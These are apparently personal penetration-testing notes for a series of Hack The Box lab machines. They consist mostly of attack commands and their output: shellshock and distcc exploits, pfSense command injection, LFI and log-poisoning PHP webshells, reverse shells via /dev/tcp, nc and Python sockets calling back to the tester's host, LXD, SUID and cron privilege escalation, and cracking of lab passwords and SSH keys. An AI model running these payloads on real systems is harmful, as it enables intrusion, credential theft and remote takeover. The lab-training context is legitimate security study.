http://10.10.10.229:5000
	403 Forbidden
cat tcp_443_http_nmap.txt
	#on certificate there are domain staging.love.htb
http://staging.love.htb/beta.php
	http://127.0.0.1:5000
	#password dashboard
	#got credz Vote Admin Creds admin: @LoveIsInTheAir!!!! 
	#login and got RCE
	##there is applocker policy
>powershell
>get-applockerpolicy -effective | select -expandproperty rulecollections







Lame Hackthebox
=========================================
sudo autorecon 10.10.10.3
	#exploit distcc port 3632
wget https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855
python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c id
python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c 'nc -c bash 10.10.14.29 4242'
exec bash --login
nc -lvp 4242
>python -c 'import pty;pty.spawn("/bin/bash")'
>id
	uid=1(daemon) gid=1(daemon) groups=1(daemon)
>find / -perm -4000 -type f 2>/dev/null
	#nmap suid privesc
>/usr/bin/nmap --interactive
>!sh
#id
	uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)








Brainfuck Hackthebox
=========================================
sudo autorecon 10.10.10.17
cat tcp_443_http_nmap.txt
	sup3rs3cr3t.brainfuck.htb
	sup3rs3cr3t.brainfuck.htb
https://brainfuck.htb
	#wordpress website
wpscan --url https://brainfuck.htb/ -e u,vp,vt,cb --disable-tls-checks
	#got 2 users, administrator and admin
wpscan --url https://brainfuck.htb/ --disable-tls-checks -U admin -P /opt/rockyou.txt
	[+] wp-support-plus-responsive-ticket-system
	 | Version: 7.1.3 (100% confidence)
	#second wpscan query got vulnerable plugins
searchsploit wordpress ticket system
searchsploit -m 41006
	#exploit wordpress prugin ticket system
cat 41006.txt
	#is just like exploit on HA Wordy vulnhub
	#create ex.html with form file
	#query as admin, refresh page
https://brainfuck.htb/wp-admin/
	#login as admin, try to reverse shell on template but template cannot written
	#next thing check installed plugins, there are smtp config with password encrypt
	#change type="password" to "text"
	#got credz SMTP orestis:kHGuERB29DNiNE
	#login imap 110
nc 10.10.10.17 110
>USER orestis
>PASS kHGuERB29DNiNE
>list
>retr 2
	#got credz orestis:kIEnnfEKJ#9UmdO to secret website
https://sup3rs3cr3t.brainfuck.htb
	#login as orestis
	#inside post there are encrypted url
	mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
	#doest waste my time, I open walktrough then found using Vigenère Cipher and how to decrypt it with this link
	http://rumkin.com/tools/cipher/vigenere.php with passphrase "fuckmybrain"
wget  https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
python ssh2john.py id_rsa > idrsa.hash
john idrsa.hash -wordlist=/opt/rockyou.txt
	3poulakia!
chmod 600 id_rsa
ssh orestis@brainfuck.htb -i id_rsa
>id
	...6(plugdev),110(lxd),1...
	#LXD groups privesc
git clone  https://github.com/saghul/lxd-alpine-builder.git
sudo ./build-alpine
>wget 10.10.14.29/alphine.tar.gz
>lxc image import ./alphine.tar.gz --alias imageku
>lxc image list
	imageku
>lxc init imageku ignite -c security.privileged=true
>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
>lxc start ignite
>lxc exec ignite /bin/sh
#id
	uid=0(root) gid=0(root)
#cd /mnt/root/root
#cat root.txt






Shocker Hackthebox
==========================================
sudo autorecon 10.10.10.56
cat tcp_80_http_dirb.txt
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x sh
http://10.10.10.56/cgi-bin/user.sh
	#firefox can't handle the response
http://10.10.10.56/cgi-bin/user.sh
	#exploit shellshock cgi-bin uptime
	#exact same as Symfonos 3 Vulnhub
curl http://10.10.10.56/cgi-bin/user.sh -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
curl http://10.10.10.56/cgi-bin/user.sh -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.29/4242 0>&1"
bash exec --login
nc -lvp 4242
>id
	uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
	#sure we can privsc with abusing lxd groups, but there is more simple way
>sudo -l
	(root) NOPASSWD: /usr/bin/perl
	#perl privesc
>sudo perl -e 'exec "/bin/sh";'
#id
	uid=0(root) gid=0(root) groups=0(root)









Bashed Hackthebox
=========================================
sudo autorecon 10.10.10.68
cat tcp_80_http_nikto.txt
	#http://10.10.10.68/dev directory
dirb http://10.10.10.68
http://10.10.10.68
	#there are webshell inside this wev
http://10.10.10.68/dev/phpbash.php
	#got reverse shell with python reverse shell
nc -lvp 4242
>id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
>sudo -l
	(scriptmanager : scriptmanager) NOPASSWD: ALL
	#change user without password
>sudo -iu scriptmanager
>id
	uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
>bash linpeas.sh
	#running linpeas got nothing userfull
	#find file belongs to scriptmanager
>find / -group scriptmanager
>find / -user scriptmanager
>cd /scripts/
>ll
	scriptmanager scriptmanager  261 Sep 23 01:40 test.py
	root          root            20 Sep 23 01:49 test.txt
	#test.py runned by root every minutes
	#change test.py with python reverse shell then got root
>cat test.py
	import os,socket,pty
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("10.10.14.29",4141))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	pty.spawn("/bin/bash")
nc -lvp 4141
>id
	uid=0(root) gid=0(root) groups=0(root)









Nibbles Hackthebox
========================================
sudo autorecon 10.10.10.75
http://10.10.10.75
view-source:http://10.10.10.75/
	<!-- /nibbleblog/ directory. Nothing interesting here! -->
http://10.10.10.75/nibbleblog
	#check nibbleblog version
http://10.10.10.75/nibbleblog/README
	Version: v4.0.3
	#exploit nibbleblog 4.0.3 plugin my_image
http://10.10.10.75/nibbleblog/admin.php
	#something shit about this box is it give no clue at all about user password
	#and bruteforce, sqli make me got banned by nobbleblog
	#searching on forum and most user said guess it with simple way
	#lol shit people will finish rockyou.txt if dont looking up on forum
	admin:nibbles
http://10.10.10.75/nibbleblog/admin.php?controller=dashboard&action=view
	#follow this website to upload shell
	#https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
	#reverse shell with python payload
exec bash --login
nc -lvp 4242
>id
	uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
>sudo -l
	(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
>cat /home/nibbler/personal/stuff/monitor.sh
	#monitoring stuff I dont care, but we can write into monitor.sh
>echo 'bash -i >& /dev/tcp/10.10.14.29/4141 0>&1' > monitor.sh
>sudo /home/nibbler/personal/stuff/monitor.sh
nc -lvp 4141
#whoami
	root









Beep hackthebox
========================================
sudo autorecon 10.10.10.7
https://10.10.10.7/
	#there are a lot of fail web request, exploit execution, dirb
	#because this is old machine and using TLSv1.0
	#and beacuse security best practice, all machine nowadays set minimum of TLS version
	#enable TLS low version
sudo nano /etc/ssl/openssl.cnf
	#change the entry MinProtocol from TLSv1.2 to TLSv1.0 or None
gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirb/common.txt -k
https://10.10.10.7/
	#elastix web service
https://10.10.10.7/admin
	#freePBX web service
https://10.10.10.7/mail
	#doundcube webmail
	##exploit elastix
searchsploit elastix
searchsploit -m 18650.py
	#change ip, port then execute, fail
	#change reverse payload with bash, python, nc, another perl but still fail
	#there is extention variable which I dont know, (elastix and PBX idk either)
	#find it on google, I can look up open extention
svwar -m INVITE -e1-999 10.10.10.7
	+-----------+----------------+
	| Extension | Authentication |
	+===========+================+
	| 233       | reqauth        |
	+-----------+----------------+
	#change extention to 233
python ex.py
>whoami
	asterisk
>sudo -l
	(root) NOPASSWD: /usr/bin/nmap
	(root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
	#chmod privsc chmod suid
>sudo chmod 4755 /bin/bash
>bash -p
#whoami
	root
		##after reading write up, there are many ways to exploit this
	#exploit elastic LFI
view-source:https://localhost.localdomain/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action
view-source:https://localhost.localdomain/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action
	#as exploit suggested on PBX config file /etc/amportal.conf there are many plain password stored
	jEhdIekWmdjE, passw0rd, jEhdIekWmdjE, amp109, amp111
	##login webmin with root:jEhdIekWmdjE
https://10.10.10.7:10000/
	#there are a lot of module we can use to get shell
	#change user password, schedule command, schedule cron job, running process -> run command
https://10.10.10.7:10000/passwd/
https://10.10.10.7:10000/proc/index_run.cgi?
	bash -c 'bash -i >& /dev/tcp/10.10.14.29/4242 0>&1'
#whoami
	root
		##shellshock webmin login
	#when webmin login, it made POST request to session_login.cgi
	#everytime there is cgi and the machine/service likely old, its potential to shellshock
POST /session_login.cgi HTTP/1.1
	User-Agent: () { :; }; echo; echo; /bin/bash -c 'ping -c 3 10.10.14.29'
	User-Agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.29/4141 0>&1
#whoami
	root
		##log poisoning webshell
	#because I have LFI, it potentially get RCE if I can put shell
	#0xdf already did it poisoning log mail, it can happen because from /etc/passwd there are no user var-www
	#so web service might run by one of the user and the user can read mail log on /var/mail/
view-source:https://localhost.localdomain/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
	#potential user fanis, spamfilter, asterisk
	#enumerate user with smtp
telnet 10.10.10.7 25
>ehlo asdasd
	250-VRFY
>VRFY asdasd
	550 5.1.1 <asdasd>: Recipient address rejected: User unknown in local recipient table
>VRFY spamfilter@localhost
	252 2.0.0 spamfilter@localhost
>VRFY fanis
>vrfy asterisk
	#all valid user on mail
	#send mail using swaks (swiss army knife SMTP)
	#try to send email to fanish but got no response maybe access denied, web service might run by asterisk
swaks --to asterisk@localhost --from asd@asd.asd --header "Subject: test asd" --body 'output: <?php system($_REQUEST["asd"]); ?>' --server 10.10.10.7
view-source:https://localhost.localdomain/vtigercrm/graph.php?current_language=../../../../../../../../../../../var/mail/asterisk%00&module=Accounts&action&asd=id
..snip...p?current_language=../../../../../../../../../../../var/mail/asterisk%00&module=Accounts&action
	From asd@asd.asd  Thu Sep 23 21:02:16 2021
..snip...p?current_language=../../../../../../../../../../../var/mail/asterisk%00&module=Accounts&action&asd=id
	output: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
..snip...p?current_language=../../../../../../../../../../../var/mail/asterisk%00&module=Accounts&action&asd=%2fbin%2fbash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.14.29%2f4141%200%3e%261
nc -lvp 4141
>whoami
	asterisk








Cronos Hackthebox
==========================================
sudo autorecon 10.10.10.13
nslookup 10.10.10.13 10.10.10.13
	ns1.chronos.htb
	#DNS enumeration
dig axfr cronos.htb @10.10.10.13
host -t axfr cronos.htb ns1.cronos.htb
dnsrecon -d cronos.htb -a -n 10.10.10.13
	#bruteforce subdomain
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400,404,403 -H "Host: FUZZ.cronos.htb" -u http://cronos.htb -t 100
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400,404,403 -H "Host: FUZZ.cronos.htb" -u http://cronos.htb -t 100 --hl 379
	#got success subdomain wwww and admin
http://admin.cronos.htb
	#sqli bypass login bypass
	#attack with intruder burp, set payload sqli auth bypass cheat sheet, set on username
	#got success sqli with payload admin#' | admin'or1=1# | admin'or 1=1 or''='
http://admin.cronos.htb/welcome.php
	#website with ping tools
	command=ping+-c+1&host=10.10.14.29
	command=wget&host=10.10.14.29/p0wny.php
>whoami
	www-data
>linpeas.sh | tee linpeas-cronos.txt
	#Crontab privesc
>cat /etc/crontab
	* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
>cd /var/www/laravel && ls -lah
	#I can write to file artisan and executed with php, so I put php reverse shell
>cp phprev.php artisan
nc -lvp 4444
#whoami
	root
	##after reading writeup we can privesc more safely and simple
	#poison artisan
head artisan
	<?php
	$sock=fsockopen("10.10.14.29", 4444);
	exec("/bin/sh -i <&3 >&3 2>&3");
	system('chown root /tmp/bash;chmod 4755 /tmp/bash');
	...snip...
nc -lvp 4444
#whoami
	root
		##Laravel and CVE-2018-15133
	#to exploit this need API_KEY, as root we can grep it
>cat /var/www/laravel/.env
	APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=








Nineveh Hackthebox
==========================================
sudo autorecon 10.10.10.43
cat tcp_443_sslscan.txt
	#there are domain nineveh.htb
	#there are 2 website that vulnerable
	#web 1 abuse LFI
http://nineveh.htb
dirb http://nineveh.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
	#there are departement directory with login form
	#try to bypass with sqli but failed
http://nineveh.htb/department/login.php
	#bruteforce login with wfuzz
wfuzz -c -w /opt/rockyou.txt -d "username=admin&password=FUZZ" -u http://nineveh.htb/department/login.php
wfuzz -c -w /opt/rockyou.txt -d "username=admin&password=FUZZ" -u http://nineveh.htb/department/login.php --hh 1639
	#got success attempt admin:1q2w3e4r5t
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
	#after several traying finally got LFI
http://nineveh.htb/department/manage.php?notes=../files/ninevehNotes.txt/../../../etc/passwd
	#web 2 abuse PhpLiteAdmin to put webshell
	#https://v3ded.github.io/ctf/zico2
dirb https://nineveh.htb/db
https://nineveh.htb/db
	#wfuzz bruteforce
wfuzz -c -w /opt/rockyou.txt -d "password=FUZZ&remember=yes&login=Log+In&proc_login=true" -u https://nineveh.htb/db/index.php
wfuzz -c -w /opt/rockyou.txt -d "password=FUZZ&remember=yes&login=Log+In&proc_login=true" -u https://nineveh.htb/db/index.php --hw 976
	#got password password123
	#create databse cmd.txt -> create table asd -> field asd, type text, default value <?php system($_GET["c"]);?>
	#database stored in /var/tmp/cmd.txt
	#trigger rce with LFI
http://10.10.10.43/department/manage.php?notes=../files//ninevehNotes.txt/../../../var/tmp/cmd.txt&c=id
	#due to encoding url I use this reverse shell payload
	#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 4242 >/tmp/f
>whoami
	www-root
>linpeas.sh | tee linpeas-nineveh.txt
>cat /etc/mail/amrois
	Amrois! please knock the door next time! 571 290 911
	#knock port check
>cat /etc/knockd.conf
knock -v 10.10.10.43 571 290 911
nmap -p- --min-rate 1000 10.10.14.43
	#port ssh is now open
	#enumerate with linpeas got nothing, I know it should be ssh to way in but cant find any id_rsa key
>cd /var/www/ssl/secure_notes
>ls
	index.html  nineveh.png
wget https://nineveh.htb/secure_notes/nineveh.png
	#enumerate file image
exiftool nineveh.png
strings nineveh.png
binwalk nineveh.png
binwalk -e nineveh.png
cd _nineveh.png.extracted/secret
cat nineveh.priv
	#got ssh key
ssh -i id_rsa amrois@10.10.10.43
>whoami
	amrois
>find / -user amrois 2>/dev/null | grep -v proc
>cd /report
	#generating report from like virus scan
	#enumerate process with pspy
>pspy64
	/usr/bin/chkrootkit
	#chkrootkit privesc
searchsploit chkrootkit
searchsploit -m 33899
cat 33899.txt
	#program will execute /tmp/update
>echo "#!/bin/bash\n\nrm /tmp/s;mkfifo /tmp/s;cat /tmp/s|/bin/sh -i 2>&1|nc 10.10.14.29 4444 >/tmp/s" > /tmp/update
nc -lvp 4444
#whoami
	root












Sense Hackthebox
======================================
sudo autorecon 10.10.10.60
https://10.10.10.60
dirb https://10.10.10.60
https://10.10.10.60/changelog.txt
	#got stuck, open forum, people said gobuster more
dirb https://10.10.10.60 -X .php,.txt,.html,.conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	#finally got hit system-users.txt, this is why the box got bad rating
https://10.10.10.60/system-users.txt
	username: Rohit
	password: company defaults
	#default password pfsense is "pfsense"
https://10.10.10.60/index.php
searchsploit pfsense
	##exploit pfsense RCE
	#there are a lof of RCE vulnerability but on this case only available on /status_rrd_graph_img.php
	#login -> status -> RRD Graph
GET /status_rrd_graph_img.php?database=queues;nc+10.10.14.29+80
GET /status_rrd_graph_img.php?database=queues;echo test+|+nc+10.10.14.29+80
	#reverse shell on OpenBSD
cat rev.txt
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 10.10.14.29 4242 > /tmp/f
	##script to convert to octal to avoid bad character on OpenBSD then using printf
cat rev.sh| od -A n -t o1 | sed 's/ /\\/g' | tr -d '\n'
GET /status_rrd_graph_img.php?database=queues;x=$(printf+"OctalShell");echo+$x>rev;sh+rev
GET /status_rrd_graph_img.php?database=queues;x=$(printf+"\162\155\040\057\164\155\160\057\146\073\155\153\146\151\146\157\040\057\164\155\160\057\146\073\143\141\164\040\057\164\155\160\057\146\174\057\142\151\156\057\163\150\040\055\151\040\062\076\046\061\174\164\145\154\156\145\164\040\061\060\056\061\060\056\061\064\056\062\071\040\064\062\064\062\040\076\040\057\164\155\160\057\146\012");echo+$x>rev;sh+rev HTTP/1.1
#whoami
	root
	##blind RCE
	#some case like this when character '-' is bad character I can use ping
	#why because I already try it ping without -c and I cant execute more RCE
	#cause ping still looping and doesn't stop so I had to reset the box
	#here some payload
>nc 10.10.14.29 80
>echo test | nc 10.10.14.29 80
>which python | nc 10.10.14.29 80
>which bash | nc 10.10.14.29 80
>nc 10.10.14.29 80 | python
>nc 10.10.14.29 80 | sh
nc -vlp 80 < rev
nc -lvp 4242
#whoami
	root









SolidState Hackthebox
==========================================
sudo autorecon 10.10.10.51
	#enumerate everythiing and spend a days looking something o from this
http://10.10.10.51/README.txt
	#open up a walktrough, unluckly autorecon didn't catch port 4555
nmap -p 4555 -sV 10.10.10.51
	4555/tcp open  james-admin JAMES Remote Admin 2.3.2
searchsploit james
python 35513.py 10.10.10.51
	#waiting and exploit not working
	#this exploit will work when there are any login ssh user
cat 35513.py
	user = 'root'
	pwd = 'root'
	#enumerate james remote admin 4555
telnet 10.0.2.28 4555
>help
>listuser
>setpassword james asd
>setpassword john asd
>setpassword mindy asd
	#password changed, then enumerate email POP3
telnet 10.0.2.28 110
>user john
>pass asd
>list
>retr 1
	#john send password to mindy
>quit
telnet 10.0.2.28 110
>user mindy
>pass asd
>list
>retr 1
>retr 2
	#got ssh credz mindy:P@55W0rd1!2@
>quit
ssh mindy@10.0.2.28
>id
	-rbash: id: command not found
	#user mindy have restricted bash
	#escape restricted bash escape rbash escape
ssh mindy@10.10.10.51 -t "bash --noprofile"
>bash linpeas.sh | tee linpeas-solidstate.txt
>cd /opt
>cat tmp.py
	#python script that cleaning /tmp directory, I can edit it, so I put python rev shell
>cat tmp.py
	import os, sys, pty,socket
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(("10.10.14.29",4242))
		os.dup2(s.fileno(),0)
		os.dup2(s.fileno(),1)
		os.dup2(s.fileno(),2)
		pty.spawn("/bin/sh")
		os.system('chown root:root /home/mindy/rbash && chmod 4777 /home/mindy/rbash')
		os.system('rm -r /tmp/* ')
nc -lvp 4242
#whoami
	root
		##after reading writeup, there is intended way to excape from rbash
	#use exploit james remote admin
telnet 10.0.2.28 4555
adduser ../../../../../../../../etc/bash_completion.d exploit
	#email to the user, dont forget to add ' in from and body
swaks --to '../../../../../../../../etc/bash_completion.d' --from "'asd@localhost" --header "Subject: test asd" --body "'/bin/nc -e /bin/bash 10.10.14.29 4141" --server 10.10.10.51
swaks --to '../../../../../../../../etc/bash_completion.d' --from "'asd@localhost" --header "Subject: test asd" --body "'\n/bin/nc -e /bin/bash 10.10.14.29 4141" --server 10.10.10.51
	#failed, try to change payload failed
	#use exploit, add & in the end of payload to keep process running at background
cat 35513.py
	...
	payload = 'nc -e /bin/bash 10.10.14.29 4141 &'
	...
python 35513.py 10.10.10.51
nc -lvp 4141
ssh mindy@10.0.2.28
>whoami
	mindy









Node Hackthebox
====================================
sudo autorecon 10.10.10.58
	#autorecon failed to recognize port 3000 as web service
http://10.10.10.58:3000/
http://10.10.10.58:3000/login
	#fuzzing name
dirb http://10.10.10.58:3000/profiles/ /usr/share/wordlists/SecLists/Usernames/Names/names.txt -f
	#find on burp there are api
	#fuzzing directory found nothing, on burp there are api
	#fuzzing api/users
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt -u http://10.10.10.58:3000/api/users/FUZZ --hc 400,404,403
curl http://10.10.10.58:3000/api/users/?: | jq
echo [{"id","a........"}] | jq > credz
	#got admin accout myP14ceAdm1nAcc0uNT:hash
hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
	#hashcat SHA256 raw
hashcat -m 21400 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af /opt/rockyou.txt
hashcat -m 1400 dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af /opt/rockyou.txt
	dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
http://10.10.10.58:3000/admin
	#download backup file
file myplace.backup
cat myplace.backup | base64 -d > file.baru 
file file.baru
	file.baru: Zip archive data, at least v1.0 to extract
	#zip password protected
	#bruteforce zip crack zip
sudo apt-get install fcrackzip
fcrackzip -u -D -p /opt/rockyou.txt file.baru
	PASSWORD FOUND!!!!: pw == magicword
unzip file.baru
	#find credential, enumerate js file, enumerate mongodb config
cd backup/var/www/html
find . -type f | grep ".conf\|.json"
greo -iR password .
grep -iR mongodb: .
cat app.js
	mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace
	#got credz mark:5AYRft73VtFpc84k
ssh mark@10.10.10.58
>linpeas.sh | tee linpeas-mark.node.txt
>find / -user tom 2>/dev/null | grep -v "proc|cache"
>ps -aux | grep tom
	tom ....7:57   0:02 /usr/bin/node /var/scheduler/app.js
>cat /var/scheduler/app.js
	const exec        = require('child_process').exec;
	...
	db.collection('tasks').find().toArray(function (error, docs) {
		....
		exec(doc.cmd);
		....
	#in database scheduler executing value inside cmd
	#insert cmd in collection tasks on mongodb
>mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler
>show tables
>show collections
	tasks
>db.tasks.find().pretty()
>db.tasks.insert({cmd : "/tmp/rev"})
>quit()
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4242 -f elf -o rev
nc -lvp 4242
>id
	uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
	#tom on group as an 1002(admin)
>find / -perm -4000 2>/dev/null
>find / -group admin -ls 2>/dev/null
	root  admin  16484 Sep 3 2017 /usr/local/bin/backup
	#I had analyze it but can't figure it out what should I do
	#after reading writeup the intended way is via buffer overflow
	#for simple unintended way is using bash new line command injection
	#https://www.exploit-db.com/exploits/32925
>ltrace -s 800 /usr/local/bin/backup asd asd asd
	strcat("/etc/myplace/key", "s")     = "/etc/myplace/keys"
>cat /etc/myplace/keys
	#keys
>ltrace -s 400 /usr/local/bin/backup asd 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 asd
	#command injection
>/usr/local/bin/backup asd 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "
>/bin/bash
>asd"
	...
	zip warning:
	...
#whoami
	root
	##enumerate js application via burpsuit
	#after seading writeup, actualy we can enumerate every js file on burpsuite
	#so every web app developed using JS, explore every js file








Valentine Hackthebox
========================================
sudo autorecon 10.10.10.79
cat tcp_443_sslscan.txt
	Issuer: /C=US/ST=FL/O=valentine.htb/CN=valentine.htb
cat tcp_80_http_nikto.txt
	+ OSVDB-3268: /dev/: Directory indexing found.
http://valentine.htb/dev/
http://valentine.htb//dev/notes.txt
http://valentine.htb//dev/hype_key
	#there are key that encrypted
cat hype_key | tr -d '[:space:]' | xxd -r -p > key
chmod 600 key
ssh hype@10.10.10.79 -i key
	Enter passphrase for key 'key':
	#crack ssh key john
python ssh2john.py key > key.john
john key.john -wordlist=/opt/rockyou.txt
	#failed got nothing
cat tcp_443_http_nmap.txt
	ssl-heartbleed:		VULNERABLE:
	#exploit heartbleed
searchsploit heartbleed
	#I use the latest one because support multiple TLS/SSL version
searchsploit -m 32764
python 32764.py 10.10.10.79
	#exploit success, got junk of flie from memory leak
	#edit exploit to print in raw insted of hexdump
cat 32764.py
	...
	hexdump(pay)
    print pay
	...
python 32764.py 10.10.10.79
	$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==X(ֱC,
echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== |base64 -d
	heartbleedbelievethehype
	#got key phrase
ssh hype@10.10.10.79 -i key
>bash linpeas.sh | tee linpeas-hype-love.txt
	root ...snip... /usr/bin/tmux -S /.devs/dev_sess
>ps -aux | grep tmux
	#tmux privesc, tmux hijack session
>ls -la /.devs/dev_sess
>/.devs/dev_sess
#whoami
	root







Poison Hackthebox
========================================
sudo autorecon 10.10.10.84
http://10.10.10.84/
	Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php 
http://10.10.10.84/phpinfo.php
http://10.10.10.84/listfiles.php
	[8] => pwdbackup.txt
http://10.10.10.84/pwdbackup.txt
	#got base64 ecoding text said encoded 13x
cat pass | base64-d | tr -d '[:space:]' | base64-d | tr -d '[:space:]'...13x
	Charix!2#4%6&8(0
http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd
	charix:*:1001:1001:charix:/home/charix:/bin/csh
sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84
>whoami
	charix
	#weird I got a shell? I see LFI and I dont have to poison the log? hmm weird
	#I check www directory, but pwdbackup.txt not edited by other player. I play this on 29 Sept 2021. hmm oke
>ls -laht /usr/local/www/apache24/data/
	-rw-r--r--  1 root  wheel   1.2K Mar 19  2018 pwdbackup.txt
	-rw-r--r--  1 root  wheel    20B Jan 24  2018 phpinfo.php
>which sh
>/bin/sh
>sh linpeas.sh
>netstat -lntp
	Illegal option
	#netstat openbsd
>netstat -an
>sockstat -l
	root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
	root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
	##VNC privesc, just like cascade Hackthebox
git clone https://github.com/trinitronx/vncpasswd.py
hexeditor ../secret
python vncpasswd.py -d -H bda85b7cd5967a21
	Decrypted Bin Pass= 'VNCP@$$!'
	Decrypted Hex Pass= '564e435040242421'
	#ssh tunnel vnc, vnc connect on port 5901
>~C
ssh> -L 5801:localhost:5801
	Forwarding port.
>~C
ssh> -L 5901:localhost:5901
	Forwarding port.
vncviewer localhost::5901
	#or just use secret directly
vncviewer localhost::5901 -passwd secret
#whoami
	root
	#send the flag
#nc 10.10.14.29 80 < root.txt
	#got root? hmm I know its not the intended way, so I open up a writeup
	##yea true there are two ways in, the intended path is log poisoning
	##LFI on browse.php
http://10.10.10.84/phpinfo.php
	#check config file on /usr/local/php
http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd
	#poison ssh access denied
http://10.10.10.84/browse.php?file=../../../../../../../var/log/auth.log
http://10.10.10.84/browse.php?file=../../../../../../../usr/local/etc/apache24/httpd.conf
	ErrorLog "/var/log/httpd-error.log"
	CustomLog "/var/log/httpd-access.log" combined
	#since I got root I check access log and it is already 8MB, so I clear it out
	#I can imagine people play this machine on free user when machine still on live
http://10.10.10.84/browse.php?file=../../../../../../../var/log/httpd-access.log
http://10.10.10.84/browse.php?file=../../../../../../../var/log/httpd-error.log
	#since access.log have huge data, I try to poison error.log
	#there are different ways to trigger error.log, in some configuration error.log can trigger by 404 request
	#I tried trigger 400 error bad request by changing host but dinn't trigger error.log
	#on this case error.log trigger by request 404 .php file
GET /raenek.php HTTP/1.1
	[Tue Sep 28 18:50:48.069139 2021] [:error] [pid 60981] [client 10.10.14.29:46936] script '/usr/local/www/apache24/data/raenek.php' not found or unable to stat
	#encoding my rce to url 
GET /asd <?php system($_GET["c"]);?> asd.php HTTP/1.1
GET /%61%73%64%20%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%22%63%22%5d%29%3b%3f%3e%20%61%73%64%2e%70%68%70 HTTP/1.1
http://10.10.10.84/browse.php?file=../../../../../../../var/log/httpd-error.log&c=id
	#php reverse shell
	which wget
	ls -la /tmp
	wget 10.10.14.29/rev.txt -O /tmp/rev.txt
http://10.10.10.84/browse.php?file=../../../../../../../var/log/httpd-error.log&c=id
>whoami
	www
	#now I understand why creator put ssh key because on live box with free account is imposible
	#I wonder why creator doesn't put cron job to clear log











Sunday Hackthebox
========================================
sudo autorecon 10.10.10.76
	#enumerate finger port 79
finger @10.10.10.76
finger root@10.10.10.76
finger admin@10.10.10.76
	#bruteforce user machine via finger
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xzvf finger-user-enum-1.0.tar.gz
perl finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76
	access, admin, root, sunny
	#can't find any password, looking on forum people said keep it simple like Valentine Box
	#so i'm guessing password would be sunday, sunny, password, password123 ???
ssh sunny@10.10.10.76 -p 22022
	no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
	#ssh error, looking on google and fix it
